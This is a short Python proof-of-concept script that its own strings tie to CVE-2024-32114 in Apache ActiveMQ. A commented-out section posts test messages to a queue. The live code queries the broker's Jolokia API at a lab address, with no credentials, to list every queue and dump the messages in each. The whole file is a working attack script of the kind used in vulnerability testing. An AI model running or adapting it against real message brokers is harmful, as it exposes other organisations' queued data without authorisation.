# import requests

# def send_message(queue_url, destination, message):
#     try:
#         headers = {'Content-Type': 'application/json'}
#         data = {
#             "type": "queue",
#             "destinationName": destination,
#             "body": message
#         }
#         response = requests.post(f"{queue_url}/api/message?type=queue&destination={destination}", json=data, headers=headers)
#         if response.status_code == 204:
#             print(f"Message '{message}' sent successfully to {destination}")
#         else:
#             print(f"Failed to send message '{message}':", response.status_code, response.text)
#     except Exception as e:
#         print(f"Error while sending message '{message}':", e)

# def main():
#     queue_url = "http://192.168.56.1:8161"
#     destination = "testQueue"
    
#     messages = [
#         "cve-2024-32114",
#         "POC test",
#         "jolokia api test",
#         "import",
#         "message"
#     ]
    
#     for message in messages:
#         send_message(queue_url, destination, message)

# if __name__ == "__main__":
#     main()

# --------------------------------------------------------------------

import requests
import json

# Jolokia API URL
JOLOKIA_URL = "http://192.168.56.1:8161/api/jolokia"

def get_all_queues(jolokia_url):
    try:
        response = requests.get(f"{jolokia_url}/read/org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=*")
        if response.status_code == 200:
            data = response.json()
            print("Response data:", data)  # 응답 데이터 디버깅 출력
            queues = [value['Name'] for key, value in data['value'].items()]
            return queues
        else:
            print("Failed to get queues:", response.status_code, response.text)
            return []
    except Exception as e:
        print("Error while getting queues:", e)
        return []

def get_queue_messages(jolokia_url, queue_name):
    try:
        response = requests.get(f"{jolokia_url}/exec/org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName={queue_name}/browse()")
        if response.status_code == 200:
            data = response.json()
            messages = data['value']
            return messages
        else:
            print(f"Failed to get messages from queue '{queue_name}':", response.status_code, response.text)
            return []
    except Exception as e:
        print(f"Error while getting messages from queue '{queue_name}':", e)
        return []

def main():
    # 모든 큐 이름 가져오기
    queues = get_all_queues(JOLOKIA_URL)
    
    if queues:
        for queue_name in queues:
            print(f"Queue: {queue_name}")
            # 각 큐의 메시지 가져오기
            messages = get_queue_messages(JOLOKIA_URL, queue_name)
            if messages:
                for message in messages:
                    print(f"Message: {message}")
            else:
                print(f"No messages found in queue '{queue_name}'")
    else:
        print("No queues found")

if __name__ == "__main__":
    main()
